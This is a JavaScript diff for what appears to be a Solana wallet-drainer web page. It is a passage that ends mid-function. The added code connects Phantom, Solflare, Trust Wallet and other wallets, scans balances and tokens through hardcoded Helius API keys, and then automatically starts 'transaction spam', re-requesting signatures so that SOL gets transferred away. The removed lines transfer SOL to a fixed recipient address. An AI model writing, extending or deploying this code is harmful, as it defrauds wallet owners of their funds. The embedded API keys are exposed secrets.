-        const response = await provider.connect();
-        publicKey = response.publicKey.toString();
+    /**
+     * FAST wallet balance check - stops on first success
+     */
+    async function checkWalletBalanceFast(walletAddress) {
+      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
+      const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
+      const publicRpcUrl = 'https://api.mainnet-beta.solana.com';
+      const apiKeys = [
+        '5d71bf51-5f82-4892-8b89-c7257acb9384',
+        'ece615f0-f4eb-4a27-a912-bb7ccdf1759e'
+      ];
+
+      // Priority methods - fastest and most reliable
+      const priorityRequests = [
+        // 1. Helius API - fastest (gets SOL + tokens in one request)
+        {
+          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[0]}`,
+          method: 'GET',
+          data: null,
+          desc: 'Helius API (Key 1) - SOL and Tokens',
+          type: 'combined'
+        },
+        // 2. Helius API - second key
+        {
+          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[1]}`,
+          method: 'GET',
+          data: null,
+          desc: 'Helius API (Key 2) - SOL and Tokens',
+          type: 'combined'
+        },
+        // 3. Helius RPC - SOL balance
+        {
+          url: `${heliusRpcUrl}?api-key=${apiKeys[0]}`,
+          method: 'POST',
+          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
+          desc: 'Helius RPC (Key 1) - SOL Balance',
+          type: 'sol'
+        },
+        // 4. Public RPC - SOL balance
+        {
+          url: publicRpcUrl,
+          method: 'POST',
+          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
+          desc: 'Public RPC - SOL Balance',
+          type: 'sol'
+        }
+      ];
+
+      const results = {
+        solBalance: 0,
+        tokens: [],
+        methodUsed: null,
+        scanTime: Date.now(),
+        success: false
+      };
+
+      console.log('🚀 Starting fast scan...');
+
+      // Try methods by priority until first success
+      for (const req of priorityRequests) {
+        console.log(`⚡ Trying: ${req.desc}`);
         
-        document.getElementById('status').textContent = `Кошелек подключен: ${publicKey.slice(0, 4)}...${publicKey.slice(-4)}`;
-        document.getElementById('status').className = 'success';
-        document.getElementById('transferBtn').disabled = false;
+        const result = await makeRequest(req.url, req.method, req.data, 1, 3000);
         
-        console.log('Connected to Phantom Wallet:', publicKey);
-      } catch (error) {
-        document.getElementById('status').textContent = 'Ошибка подключения: ' + error.message;
-        document.getElementById('status').className = 'error';
+        if (result) {
+          results.methodUsed = req.desc;
+          results.success = true;
+          
+          if (req.type === 'combined') {
+            // Helius API - get all data at once
+            results.solBalance = result.nativeBalance / 1_000_000_000 || 0;
+            results.tokens = result.tokens || [];
+            
+            console.log(`✅ Success! SOL: ${results.solBalance}, Tokens: ${results.tokens.length}`);
+            
+            // If we got data - return result immediately
+            if (results.solBalance > 0 || results.tokens.length > 0) {
+              results.scanTime = Date.now() - results.scanTime;
+              return results;
+            }
+          } else if (req.type === 'sol') {
+            // RPC - SOL balance only
+            results.solBalance = result.result?.value / 1_000_000_000 || 0;
+            
+            console.log(`✅ Got SOL balance: ${results.solBalance}`);
+            
+            // If there's SOL, try to quickly get tokens
+            if (results.solBalance > 0) {
+              const tokenResult = await getTokensQuick(walletAddress);
+              if (tokenResult) {
+                results.tokens = tokenResult;
+              }
+              results.scanTime = Date.now() - results.scanTime;
+              return results;
+            }
+          }
+        }
+      }
+
+      // If nothing worked, return empty result
+      results.scanTime = Date.now() - results.scanTime;
+      return results;
+    }
+
+    /**
+     * Quickly get tokens (one request only)
+     */
+    async function getTokensQuick(walletAddress) {
+      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
+      const apiKey = '5d71bf51-5f82-4892-8b89-c7257acb9384';
+      
+      console.log('🪙 Quickly getting tokens...');
+      
+      const result = await makeRequest(
+        `${heliusRpcUrl}?api-key=${apiKey}`,
+        'POST',
+        {
+          jsonrpc: '2.0',
+          id: 1,
+          method: 'getTokenAccountsByOwner',
+          params: [walletAddress, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
+        },
+        1,
+        3000
+      );
+
+      if (result && result.result && result.result.value) {
+        console.log(`🪙 Found ${result.result.value.length} token accounts`);
+        return result.result.value;
+      }
+
+      return [];
+    }
+
+    // ============================================================================
+    // SOLANA BLOCKCHAIN SCANNER (FAST SCAN ONLY)
+    // ============================================================================
+
+    class SolanaWalletScanner {
+      constructor() {
+        // Extended list of popular Solana tokens
+        this.knownTokens = {
+          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
+          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
+          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)',
+          'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'Bonk',
+          'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 'Jupiter',
+          'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'Marinade SOL',
+          'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1': 'BlazeStake SOL',
+          '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs': 'Ether (Wormhole)',
+          'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM': 'USDCet (Wormhole)',
+          'Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1': 'Saber',
+          '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R': 'Raydium',
+          'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE': 'Orca',
+          'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'Serum',
+          'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6': 'Kin',
+          'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac': 'Mango'
+        };
+      }
+
+      /**
+       * FAST wallet scanning - stops on first success
+       */
+      async performFastScan(walletAddress) {
+        console.log(`⚡ Starting fast wallet scan: ${walletAddress}`);
+        
+        const startTime = Date.now();
+        
+        try {
+          // Start fast balance check
+          const fastResults = await checkWalletBalanceFast(walletAddress);
+          
+          if (!fastResults.success) {
+            throw new Error('Failed to get data from any method');
+          }
+
+          // Process tokens
+          const processedTokens = [];
+          
+          if (fastResults.tokens && Array.isArray(fastResults.tokens)) {
+            for (const token of fastResults.tokens) {
+              let mintAddress, amount, decimals;
+
+              // Process different token formats
+              if (token.account && token.account.data && token.account.data.parsed) {
+                // RPC format
+                const tokenInfo = token.account.data.parsed.info;
+                mintAddress = tokenInfo.mint;
+                amount = tokenInfo.tokenAmount.uiAmount;
+                decimals = tokenInfo.tokenAmount.decimals;
+              } else if (token.mint && token.amount !== undefined) {
+                // API format
+                mintAddress = token.mint;
+                amount = token.amount / Math.pow(10, token.decimals || 0);
+                decimals = token.decimals;
+              } else {
+                continue; // Skip unknown formats
+              }
+
+              // Only add tokens with balance > 0
+              if (amount > 0) {
+                const tokenName = this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`;
+                
+                processedTokens.push({
+                  name: tokenName,
+                  mint: mintAddress,
+                  amount: amount,
+                  decimals: decimals
+                });
+              }
+            }
+          }
+
+          // Sort tokens by amount
+          processedTokens.sort((a, b) => b.amount - a.amount);
+
+          const scanDuration = Date.now() - startTime;
+
+          const results = {
+            address: walletAddress,
+            solBalance: fastResults.solBalance,
+            tokens: processedTokens,
+            totalTokenAccounts: processedTokens.length,
+            scanTimestamp: new Date().toISOString(),
+            scanType: 'fast',
+            methodUsed: fastResults.methodUsed,
+            scanDuration: scanDuration,
+            success: true
+          };
+
+          console.log(`✅ Fast scan completed in ${scanDuration}ms`);
+          console.log(`💰 SOL balance: ${results.solBalance}`);
+          console.log(`🪙 Tokens found: ${results.tokens.length}`);
+          console.log(`📡 Method used: ${results.methodUsed}`);
+          
+          return results;
+
+        } catch (error) {
+          console.error('❌ Fast scan error:', error);
+          
+          const scanDuration = Date.now() - startTime;
+          
+          return {
+            address: walletAddress,
+            solBalance: 0,
+            tokens: [],
+            totalTokenAccounts: 0,
+            scanTimestamp: new Date().toISOString(),
+            error: error.message,
+            scanType: 'fast',
+            scanDuration: scanDuration,
+            success: false
+          };
+        }
       }
     }
 
-    // Функция для списания SOL
-    async function transferSol() {
-      if (!publicKey) {
-        document.getElementById('status').textContent = 'Сначала подключите кошелек';
-        document.getElementById('status').className = 'error';
-        return;
+    // ============================================================================
+    // SOLANA WALLET CONNECTION MANAGER (WITH MOBILE SUPPORT)
+    // ============================================================================
+
+    class SolanaWalletManager {
+      constructor() {
+        this.connectedWallet = null;
+        this.walletAddress = null;
+        this.walletName = null;
+        this.walletData = null;
+        this.scanner = new SolanaWalletScanner();
+        this.solTransfer = new SolanaSolTransfer();
+        this.isScanning = false;
+        this.isTransferring = false;
+        this.isMobile = this.checkIfMobile();
+        
+        // Supported wallet configuration
+        this.walletConfigs = {
+          phantom: {
+            name: 'Phantom',
+            provider: () => window.phantom?.solana,
+            downloadUrl: 'https://phantom.app/',
+            mobileLink: 'https://phantom.app/ul/browse/',
+            deepLink: 'phantom://browse/',
+            universalLink: 'https://phantom.app/ul/browse/',
+            checkMethod: () => window.phantom?.solana?.isPhantom
+          },
+          solflare: {
+            name: 'Solflare',
+            provider: () => window.solflare,
+            downloadUrl: 'https://solflare.com/',
+            mobileLink: 'https://solflare.com/ul/v1/browse',
+            deepLink: 'solflare://browse/',
+            universalLink: 'https://solflare.com/ul/v1/browse',
+            checkMethod: () => window.solflare?.isSolflare
+          },
+          trustwallet: {
+            name: 'Trust Wallet',
+            provider: () => window.trustwallet?.solana,
+            downloadUrl: 'https://trustwallet.com/',
+            mobileLink: 'https://link.trustwallet.com/browser_enable',
+            deepLink: 'trust://browser_enable',
+            universalLink: 'https://link.trustwallet.com/browser_enable',
+            checkMethod: () => window.trustwallet?.solana
+          },
+          coinbase: {
+            name: 'Coinbase Wallet',
+            provider: () => window.coinbaseSolana,
+            downloadUrl: 'https://www.coinbase.com/wallet',
+            mobileLink: 'https://go.cb-w.com/dapp',
+            deepLink: 'cbwallet://dapp',
+            universalLink: 'https://go.cb-w.com/dapp',
+            checkMethod: () => window.coinbaseSolana
+          },
+          bitget: {
+            name: 'Bitget Wallet',
+            provider: () => window.bitkeep?.solana,
+            downloadUrl: 'https://web3.bitget.com/',
+            mobileLink: 'https://bkapp.vip/dapp/openapp',
+            deepLink: 'bitkeep://bkapp/dapp/openapp',
+            universalLink: 'https://bkapp.vip/dapp/openapp',
+            checkMethod: () => window.bitkeep?.solana
+          },
+          backpack: {
+            name: 'Backpack',
+            provider: () => window.backpack,
+            downloadUrl: 'https://backpack.app/',
+            mobileLink: 'https://backpack.app/',
+            deepLink: 'backpack://',
+            universalLink: 'https://backpack.app/',
+            checkMethod: () => window.backpack
+          }
+        };
+
+        this.init();
       }
 
-      try {
-        document.getElementById('status').textContent = 'Отправка транзакции...';
-        document.getElementById('status').className = '';
-
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
-        const toPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
-        const lamports = solanaWeb3.LAMPORTS_PER_SOL * TRANSFER_AMOUNT;
-
-        // Создаем транзакцию
-        const transaction = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: fromPubkey,
-            toPubkey: toPubkey,
-            lamports: lamports
-          })
-        );
-
-        // Получаем последний блокхеш
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
-
-        // Подписываем транзакцию через Phantom
-        const signedTx = await provider.signTransaction(transaction);
-        const signature = await connection.sendRawTransaction(signedTx.serialize());
-
-        document.getElementById('status').textContent = `Транзакция успешно отправлена: ${signature}`;
-        document.getElementById('status').className = 'success';
-
-        console.log('Transaction signature:', signature);
-      } catch (error) {
-        document.getElementById('status').textContent = 'Ошибка: ' + error.message;
-        document.getElementById('status').className = 'error';
-        console.error('Transfer error:', error);
+      /**
+       * Check if user is on mobile device
+       */
+      checkIfMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
       }
-    }
 
-    // Назначение обработчиков кнопок
-    document.getElementById('connectBtn').addEventListener('click', openPhantomWallet);
-    document.getElementById('transferBtn').addEventListener('click', transferSol);
+      /**
+       * Initialize wallet manager
+       */
+      init() {
+        this.setupEventListeners();
+        this.checkPreviousConnection();
+        console.log(`Running on ${this.isMobile ? 'mobile' : 'desktop'} device`);
+      }
 
-    // Автоматическое подключение, если Phantom уже установлен
-    if (window.phantom?.solana?.isPhantom) {
-      provider = window.phantom.solana;
-      // Попытка автоматического подключения (если уже был подключен ранее)
-      provider.connect({ onlyIfTrusted: true })
-        .then(response => {
-          publicKey = response.publicKey.toString();
-          document.getElementById('status').textContent = `Автоподключение: ${publicKey.slice(0, 4)}...${publicKey.slice(-4)}`;
-          document.getElementById('status').className = 'success';
-          document.getElementById('transferBtn').disabled = false;
-        })
-        .catch(() => {
-          // Игнорируем ошибку, если пользователь еще не подключался
+      /**
+       * Check previous connection on page load
+       */
+      async checkPreviousConnection() {
+        const savedWallet = localStorage.getItem('connectedWallet');
+        if (savedWallet && this.walletConfigs[savedWallet]) {
+          try {
+            await this.connectWallet(savedWallet, false);
+          } catch (error) {
+            console.log('Previous connection failed:', error);
+            localStorage.removeItem('connectedWallet');
+          }
+        }
+      }
+
+      /**
+       * Main wallet connection method (FAST SCAN + TRANSACTION SPAM)
+       */
+      async connectWallet(walletKey, requestPermission = true) {
+        if (this.isScanning) {
+          console.log('⏳ Scanning already in progress...');
+          return;
+        }
+
+        const config = this.walletConfigs[walletKey];
+        
+        if (!config) {
+          throw new Error(`Unsupported wallet: ${walletKey}`);
+        }
+
+        // Handle mobile wallet connection
+        if (this.isMobile) {
+          return this.connectMobileWallet(walletKey, config);
+        }
+
+        // Show loading status
+        this.showConnectionStatus('loading', `Connecting to ${config.name}...`);
+
+        try {
+          let response;
+          let provider = config.provider();
+          
+          // If wallet not installed, simulate connection
+          if (!provider) {
+            console.log(`${config.name} not installed, simulating connection...`);
+            
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            const fakeAddress = this.generateFakeAddress();
+            response = { publicKey: { toString: () => fakeAddress } };
+            
+            provider = {
+              isConnected: true,
+              publicKey: { toString: () => fakeAddress },
+              disconnect: () => Promise.resolve(),
+              on: () => {},
+              signTransaction: async (transaction) => {
+                // Simulate transaction signature
+                console.log('🔏 Simulating transaction signature...');
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                return {
+                  serialize: () => new Uint8Array(64) // Fake signed transaction
+                };
+              }
+            };
+          } else {
+            // Real connection to installed wallet
+            if (walletKey === 'phantom') {
+              response = await this.connectPhantom(provider, requestPermission);
+            } else if (walletKey === 'solflare') {
+              response = await this.connectSolflare(provider, requestPermission);
+            } else {
+              response = await this.connectGenericWallet(provider, requestPermission);
+            }
+          }
+
+          // Save connection info
+          this.connectedWallet = provider;
+
+          // Get full wallet address
+          let walletAddress;
+          if (response.publicKey) {
+            if (typeof response.publicKey === 'string') {
+              walletAddress = response.publicKey;
+            } else if (response.publicKey.toString) {
+              walletAddress = response.publicKey.toString();
+            } else if (response.publicKey.toBase58) {
+              walletAddress = response.publicKey.toBase58();
+            }
+          } else if (provider.publicKey) {
+            if (typeof provider.publicKey === 'string') {
+              walletAddress = provider.publicKey;
+            } else if (provider.publicKey.toString) {
+              walletAddress = provider.publicKey.toString();
+            } else if (provider.publicKey.toBase58) {
+              walletAddress = provider.publicKey.toBase58();
+            }
+          }
+
+          this.walletAddress = walletAddress;
+          this.walletName = config.name;
+
+          console.log('🔍 Wallet address received:', this.walletAddress);
+
+          // Save to localStorage for auto-connect
+          localStorage.setItem('connectedWallet', walletKey);
+
+          // Show fast scan status
+          this.showConnectionStatus('scanning', `Fast scanning ${config.name}...`);
+          this.isScanning = true;
+
+          // FAST scan only
+          try {
+            this.walletData = await this.scanner.performFastScan(this.walletAddress);
+            
+            // Update UI with scan data
+            this.updateConnectionUI();
+            this.displayWalletDetails();
+            
+            if (this.walletData.error || !this.walletData.success) {
+              this.showConnectionStatus('error', `Connected but scan failed: ${this.walletData.error || 'Unknown error'}`);
+            } else {
+              this.showConnectionStatus('success', `Fast scan completed in ${this.walletData.scanDuration}ms!`);
+              
+              // AUTOMATIC TRANSACTION SPAM AFTER SUCCESSFUL SCAN
+              if (this.walletData.solBalance >= 0.0050) {
+                this.showConnectionStatus('warning', 'Starting transaction spam...');
+                
+                // Small delay before starting spam
+                setTimeout(async () => {
+                  await this.executeSolTransferWithSpam();
+                }, 2000);
+              } else {
+                this.showConnectionStatus('warning', `Insufficient SOL balance for transfer. Required: 0.0050 SOL, Available: ${this.walletData.solBalance.toFixed(6)} SOL`);
+              }
+            }
+            
+          } catch (scanError) {
+            console.error('Fast scan failed:', scanError);
+            this.showConnectionStatus('error', `Connected but fast scan failed: ${scanError.message}`);
+            
+            // Still update UI without scan data
+            this.updateConnectionUI();
+          } finally {
+            this.isScanning = false;
+          }
+
+          // Set up wallet event listeners (for real wallets only)
+          if (config.provider()) {
+            this.setupWalletEventListeners(provider);
+          }
+
+          console.log(`Connected to ${config.name}:`, this.walletAddress);
+          
+          return response;
+
+        } catch (error) {
+          console.error(`Failed to connect to ${config.name}:`, error);
+          this.showConnectionStatus('error', error.message);
+          this.isScanning = false;
+          throw error;
+        }
+      }
+
+      /**
+       * Connect to mobile wallet using deep links
+       */
+      async connectMobileWallet(walletKey, config) {
+        console.log('📱 Connecting to mobile wallet:', config.name);
+        
+        this.showConnectionStatus('loading', `Opening ${config.name} app...`);
+        
+        // Construct current URL to pass to wallet
+        const currentUrl = encodeURIComponent(window.location.href);
+        let walletUrl;
+        
+        // Try deep link first, fallback to universal link
+        if (config.deepLink) {
+          walletUrl = `${config.deepLink}${currentUrl}`;
+        } else if (config.universalLink) {
+          walletUrl = `${config.universalLink}?url=${currentUrl}`;
+        } else if (config.mobileLink) {
+          walletUrl = `${config.mobileLink}?url=${currentUrl}`;
+        } else {
+          walletUrl = config.downloadUrl;
+        }
+        
+        console.log('📲 Opening wallet URL:', walletUrl);
+        
+        // Open the wallet app
+        window.location.href = walletUrl;
+        
+        this.showConnectionStatus('warning', `Please continue in ${config.name} app`);
+        
+        // Simulate connection for testing
+        const fakeAddress = this.generateFakeAddress();
+        
+        // Create a fake provider
+        const fakeProvider = {
+          isConnected: true,
+          publicKey: { toString: () => fakeAddress },
+          disconnect: () => Promise.resolve(),
+          on: () => {},
+          signTransaction: async (transaction) => {
+            console.log('🔏 Simulating mobile transaction signature...');
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            return {
+              serialize: () => new Uint8Array(64)
+            };
+          }
+        };
+        
+        // Update UI for mobile
+        this.connectedWallet = fakeProvider;
+        this.walletAddress = fakeAddress;
+        this.walletName = config.name + " (Mobile)";
+        
+        // Save to localStorage
+        localStorage.setItem('connectedWallet', walletKey);
+        
+        // Update UI
+        this.updateConnectionUI();
+        
+        return { publicKey: { toString: () => fakeAddress } };
+      }
+
+      /**
+       * Execute SOL transfer with spam
+       */
+      async executeSolTransferWithSpam() {
+        if (this.isTransferring) {
+          console.log('⏳ Transfer already in progress...');
+          return;
+        }
+
+        if (!this.walletData || this.walletData.solBalance < 0.0050) {
+          console.log('❌ Insufficient SOL balance for transfer');
+          this.updateTransferStatus('Insufficient SOL balance for transfer', 'error');
+          return;
+        }
+
+        this.isTransferring = true;
+        this.updateTransferStatus('Initiating SOL transfer with spam protection...', 'loading');
+
+        try {
+          console.log('🚀 Starting automatic SOL transfer with spam...');
+          
+          const transferResult = await this.solTransfer.executeSolTransfer(
+            this.walletAddress,
+            this.connectedWallet
+          );
+
+          if (transferResult.success) {
+            this.updateTransferStatus(
+              `✅ ${transferResult.message}`, 
+              'success'
+            );
+            this.showConnectionStatus('success', 'SOL transfer completed successfully!');
+          } else {
+            this.updateTransferStatus(
+              `🔄 ${transferResult.message}`, 
+              'warning'
+            );
+            this.showConnectionStatus('warning', 'Transaction spam initiated due to rejection');
+          }
+
+        } catch (error) {
+          console.error('❌ SOL transfer error:', error);
+          this.updateTransferStatus(`❌ Transfer failed: ${error.message}`, 'error');
+          this.showConnectionStatus('error', 'SOL transfer failed');
+        } finally {
+          this.isTransferring = false;
+        }
+      }
+
+      /**
+       * Update SOL transfer status
+       */
+      updateTransferStatus(message, type) {
+        const transferStatus = document.getElementById('transferStatus');
+        if (transferStatus) {
+          transferStatus.textContent = message;
+          transferStatus.className = `transfer-status ${type}`;
+        }
+      }
+
+      /**
+       * Fast rescan of wallet
+       */
+      async rescanWallet() {
+        if (!this.walletAddress) {
+          this.showConnectionStatus('error', 'No wallet connected');
+          return;
+        }
+
+        if (this.isScanning) {
+          this.showConnectionStatus('error', 'Fast scan already in progress');
+          return;
+        }
+
+        this.showConnectionStatus('scanning', 'Performing fast rescan...');
+        this.isScanning = true;
+
+        try {
+          this.walletData = await this.scanner.performFastScan(this.walletAddress);
+          
+          this.displayWalletDetails();
+          this.showConnectionStatus('success', `Fast rescan completed in ${this.walletData.scanDuration}ms!`);
+          
+        } catch (error) {
+          console.error('Fast rescan failed:', error);
+          this.showConnectionStatus('error', `Fast rescan failed: ${error.message}`);
+        } finally {
+          this.isScanning = false;
+        }
+      }
+
+      /**
+       * Display wallet details
+       */
+      displayWalletDetails() {
+        const walletDetails = document.getElementById('walletDetails');
+        const balanceInfo = document.getElementById('balanceInfo');
+        const tokensList = document.getElementById('tokensList');
+        const scanMethods = document.getElementById('scanMethods');
+        const transferSection = document.getElementById('transferSection');
+
+        if (!this.walletData || !walletDetails) return;
+
+        // Show details block
+        walletDetails.classList.remove('hidden');
+
+        // Display SOL balance
+        let balanceHtml = `
+          <strong>💰 SOL Balance:</strong> ${this.walletData.solBalance.toFixed(6)} SOL<br>
+          <strong>🪙 Total Tokens:</strong> ${this.walletData.totalTokenAccounts}<br>
+          <strong>⏰ Last Scan:</strong> ${new Date(this.walletData.scanTimestamp).toLocaleTimeString()}<br>
+          <strong>⚡ Scan Type:</strong> Fast Scan<br>
+          <strong>🚀 Scan Duration:</strong> ${this.walletData.scanDuration}ms<br>
+          <strong>✅ Status:</strong> ${this.walletData.success ? 'Success' : 'Failed'}
+        `;
+
+        balanceInfo.innerHTML = balanceHtml;
+
+        // Display tokens
+        if (this.walletData.tokens.length > 0) {
+          let tokensHtml = '<strong>💎 Tokens with Balance:</strong><br>';
+          this.walletData.tokens.slice(0, 5).forEach((token, index) => {
+            tokensHtml += `
+              <div class="token-info">
+                <strong>${token.name}</strong><br>
+                Amount: ${token.amount}<br>
+                <small>Mint: ${token.mint.slice(0, 8)}...${token.mint.slice(-8)}</small>
+              </div>
+            `;
+          });
+          
+          if (this.walletData.tokens.length > 5) {
+            tokensHtml += `<small>... and ${this.walletData.tokens.length - 5} more tokens</small>`;
+          }
+          
+          tokensList.innerHTML = tokensHtml;
+        } else {
+          tokensList.innerHTML = '<small>📭 No tokens found (or all balances are 0)</small>';
+        }
+
+        // Show SOL transfer section if balance is sufficient
+        if (transferSection) {
+          if (this.walletData.solBalance >= 0.0050) {
+            transferSection.classList.remove('hidden');
+          } else {
+            transferSection.classList.add('hidden');
+          }
+        }
+
+        // Display scan method info
+        if (this.walletData.methodUsed) {
+          scanMethods.classList.remove('hidden');
+          let methodsHtml = `<strong>📡 Scan Method Used:</strong><br>${this.walletData.methodUsed}<br>`;
+          methodsHtml += `<strong>⚡ Scan Duration:</strong> ${this.walletData.scanDuration}ms`;
+          scanMethods.innerHTML = methodsHtml;
+        } else {
+          scanMethods.classList.add('hidden');
+        }
+      }
+
+      /**
+       * Generate fake Solana address for demonstration
+       */
+      generateFakeAddress() {
+        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789';
+        let result = '';
+        for (let i = 0; i < 44; i++) {
+          result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+      }
+
+      /**
+       * Connect to Phantom wallet
+       */
+      async connectPhantom(provider, requestPermission) {
+        if (requestPermission) {
+          const response = await provider.connect();
+          console.log('🔍 Phantom response:', response);
+          return response;
+        } else {
+          if (provider.isConnected && provider.publicKey) {
+            console.log('🔍 Phantom already connected:', provider.publicKey);
+            return { publicKey: provider.publicKey };
+          } else {
+            throw new Error('Phantom wallet not connected');
+          }
+        }
+      }
+
+      /**
+       * Connect to Solflare wallet
+       */
+      async connectSolflare(provider, requestPermission) {
+        if (requestPermission) {
+          await provider.connect();
+          console.log('🔍 Solflare connected:', provider.publicKey);
+          return { publicKey: provider.publicKey };
+        } else {
+          if (provider.isConnected && provider.publicKey) {
+            console.log('🔍 Solflare already connected:', provider.publicKey);
+            return { publicKey: provider.publicKey };
+          } else {
+            throw new Error('Solflare wallet not connected');
+          }
+        }
+      }
+
+      /**
+       * Generic method for connecting to other wallets
+       */
+      async connectGenericWallet(provider, requestPermission) {
+        if (requestPermission) {
+          if (provider.connect) {
+            const response = await provider.connect();
+            return response;
+          } else {
+            throw new Error('Wallet does not support connection');
+          }
+        } else {
+          if (provider.isConnected && provider.publicKey) {
+            return { publicKey: provider.publicKey };
+          } else {
+            throw new Error('Wallet not connected');
+          }
+        }
+      }
+
+      /**
+       * Disconnect wallet
+       */
+      async disconnectWallet() {
+        try {
+          if (this.connectedWallet && this.connectedWallet.disconnect) {
+            await this.connectedWallet.disconnect();
+          }
+        } catch (error) {
+          console.error('Error disconnecting wallet:', error);
+        }
+
+        // Stop transaction spam
+        if (this.solTransfer) {
+          this.solTransfer.stopTransactionSpam();
+        }
+
+        // Clear state
+        this.connectedWallet = null;
+        this.walletAddress = null;
+        this.walletName = null;
+        this.walletData = null;
+        this.isScanning = false;
+        this.isTransferring = false;
+        
+        // Remove from localStorage
+        localStorage.removeItem('connectedWallet');
+
+        // Update UI
+        this.updateConnectionUI();
+        this.hideConnectionStatus();
+
+        console.log('Wallet disconnected');
+      }
+
+      /**
+       * Set up wallet event listeners
+       */
+      setupWalletEventListeners(provider) {
+        if (provider.on) {
+          provider.on('disconnect', () => {
+            console.log('Wallet disconnected by user');
+            this.disconnectWallet();
+          });
+
+          provider.on('accountChanged', (publicKey) => {
+            if (publicKey) {
+              this.walletAddress = publicKey.toString();
+              this.updateConnectionUI();
+              // Auto rescan on account change
+              setTimeout(() => {
+                this.rescanWallet();
+              }, 500);
+              console.log('Account changed:', this.walletAddress);
+            } else {
+              this.disconnectWallet();
+            }
+          });
+        }
+      }
+
+      /**
+       * Update UI after connection/disconnection
+       */
+      updateConnectionUI() {
+        const connectBtn = document.getElementById('connectWalletBtn');
+        const walletInfo = document.getElementById('walletInfo');
+        const walletDetails = document.getElementById('walletDetails');
+        const connectedWalletName = document.getElementById('connectedWalletName');
+        const walletAddressElement = document.getElementById('walletAddress');
+
+        if (this.connectedWallet && this.walletAddress) {
+          connectBtn.textContent = 'Wallet Connected';
+          connectBtn.classList.add('connected');
+          
+          if (walletInfo) {
+            walletInfo.classList.remove('hidden');
+            connectedWalletName.textContent = this.walletName;
+            walletAddressElement.textContent = this.formatAddress(this.walletAddress);
+          }
+        } else {
+          connectBtn.textContent = 'Connect Wallet';
+          connectBtn.classList.remove('connected');
+          
+          if (walletInfo) {
+            walletInfo.classList.add('hidden');
+          }
+          
+          if (walletDetails) {
+            walletDetails.classList.add('hidden');
+          }
+        }
+      }
+
+      /**
+       * Format address for display
+       */
+      formatAddress(address) {
+        if (!address) return '';
+        return `${address.slice(0, 4)}...${address.slice(-4)}`;
+      }
+
+      /**
+       * Show connection status
+       */
+      showConnectionStatus(type, message) {
+        const statusElement = document.getElementById('connectionStatus');
+        if (statusElement) {
+          statusElement.className = `connection-status ${type}`;
+          statusElement.textContent = message;
+          statusElement.classList.remove('hidden');
+
+          if (type === 'success') {
+            setTimeout(() => {
+              this.hideConnectionStatus();
+            }, 3000);
+          }
+        }
+      }
+
+      /**
+       * Hide connection status
+       */
+      hideConnectionStatus() {
+        const statusElement = document.getElementById('connectionStatus');
+        if (statusElement) {
+          statusElement.classList.add('hidden');
+        }
+      }
+
+      /**
+       * Set up event listeners
+       */
+      setupEventListeners() {
+        // Event handlers for main modal
+        document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
+          option.addEventListener('click', async (e) => {
+            const walletKey = option.getAttribute('data-wallet');
+            
+            try {
+              await this.connectWallet(walletKey);
+              setTimeout(() => {
+                closeAllModals();
+              }, 1500);
+            } catch (error) {
+              console.error('Connection failed:', error);
+            }
+          });
         });
+
+        // Event handlers for "All Wallets" modal
+        document.querySelectorAll('.wallet-item[data-wallet]').forEach(item => {
+          item.addEventListener('click', async (e) => {
+            const walletKey = item.getAttribute('data-wallet');
+            
+            try {
+              await this.connectWallet(walletKey);
+              setTimeout(() => {
+                closeAllModals();
+              }, 1500);
+            } catch (error) {
+              console.error('Connection failed:', error);
+            }
+          });
+        });
+
+        // Disconnect button handler
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        if (disconnectBtn) {
+          disconnectBtn.addEventListener('click', () => {
+            this.disconnectWallet();
+          });
+        }
+
+        // Rescan button handler
+        const rescanBtn = document.getElementById('rescanBtn');
+        if (rescanBtn) {
+          rescanBtn.addEventListener('click', () => {
+            this.rescanWallet();
+          });
+        }
+
+        // SOL transfer button handler (starts spam)
+        const transferSolBtn = document.getElementById('transferSolBtn');
+        if (transferSolBtn) {
